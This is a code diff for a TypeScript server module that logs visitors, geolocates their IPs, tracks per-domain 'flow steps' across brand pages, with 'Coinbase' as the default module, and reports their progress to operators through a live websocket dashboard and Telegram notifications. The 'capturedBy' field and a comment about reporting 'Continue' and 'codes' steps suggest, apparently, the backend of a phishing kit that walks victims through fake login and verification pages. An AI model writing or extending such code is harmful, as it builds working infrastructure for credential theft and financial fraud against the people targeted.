@@ -2,8 +2,9 @@ import crypto from 'node:crypto';
 import { serverState, type Visitor } from './state.js';
 import { broadcast, broadcastStats } from './websocket.js';
 import { lookupIp } from './geoip.js';
-import { dbGetDomainByHost } from './database.js';
-import { notifyVisitorConnect, notifyVisitorPage } from './telegram.js';
+import { dbGetDomainByHost, dbSetVisitorFlowSteps } from './database.js';
+import { firstValidFlowStep, isValidFlowLabel } from './funnel.js';
+import { notifyVisitorConnect, routesEquivalent } from './telegram.js';
 
 export interface VisitorConnectInput {
 	ip: string;
@@ -50,7 +51,9 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 	const userAgent = input.userAgent || '';
 	const host = (input.host || '').toLowerCase();
 	const path = input.path || '/loading';
-	const pageRoute = input.brand && input.page ? `${input.brand}/${input.page}` : path;
+	const clientPageLabel =
+		input.brand && input.page ? `${input.brand}/${input.page}` : '';
+	const pageRoute = clientPageLabel || path;
 
 	const domain = host ? dbGetDomainByHost(host) : undefined;
 	const module = input.module || domain?.module || input.brand || 'Coinbase';
@@ -69,24 +72,20 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 	const isNewSession = !existing || existing.status === 'offline';
 	const previousPageRoute = existing?.lastPageRoute || existing?.lastPage || '';
 
-	const isValidLabel = (s: string) => /^[A-Z][^/]+\/.+/.test(s);
-
 	const initialFlowSteps =
 		existing?.flowSteps?.length
 			? existing.flowSteps
 			: domainFlow && !existing
 				? domainFlow.steps.map((page) => ({
 					page,
-					passed: !isValidLabel(page)
+					passed: !isValidFlowLabel(page)
 				}))
 				: [];
 
-	const autoTarget =
-		!existing && domainFlow
-			? (domainFlow.steps.find((s) => isValidLabel(s)) || '')
-			: '';
+	const flowEntryLabel =
+		!existing && domainFlow ? firstValidFlowStep(domainFlow.steps) || '' : '';
 
-	const effectivePage = autoTarget || pageRoute;
+	const effectivePage = flowEntryLabel || pageRoute;
 
 	const visitor: Visitor = {
 		ip,
@@ -126,6 +125,14 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 
 	serverState.addVisitor(visitor);
 
+	if (!existing && domainFlow && initialFlowSteps.length > 0) {
+		try {
+			dbSetVisitorFlowSteps(ip, initialFlowSteps);
+		} catch {
+			/* non-critical */
+		}
+	}
+
 	if (isNewSession) {
 		const logEntry = serverState.addLogEntry(`Visitor ${ip} connected — ${flow}`, 'connect');
 		broadcast({ type: 'visitor:connected', payload: visitor });
@@ -148,29 +155,14 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 		broadcast({ type: 'visitor:updated', payload: visitor });
 		broadcastStats();
 
-		if (previousPageRoute && previousPageRoute !== effectivePage) {
+		const navigatedTo = clientPageLabel || pageRoute;
+		if (previousPageRoute && navigatedTo && !routesEquivalent(previousPageRoute, navigatedTo)) {
 			const logEntry = serverState.addLogEntry(
-				`Visitor ${ip} moved to ${effectivePage}`,
+				`Visitor ${ip} moved to ${navigatedTo}`,
 				'action'
 			);
 			broadcast({ type: 'log:new', payload: logEntry });
-
-			notifyVisitorPage(
-				{
-					ip: visitor.ip,
-					userId: visitor.userId,
-					city: visitor.city,
-					region: visitor.region,
-					country: visitor.country,
-					browser: visitor.browser,
-					platform: visitor.platform,
-					module: visitor.module,
-					capturedBy: visitor.capturedBy,
-					lastPageRoute: visitor.lastPageRoute
-				},
-				previousPageRoute,
-				effectivePage
-			).catch(() => {});
+			// Telegram: each step is reported via notifyPageAction (Continue, codes, etc.)
 		}
 	}
 
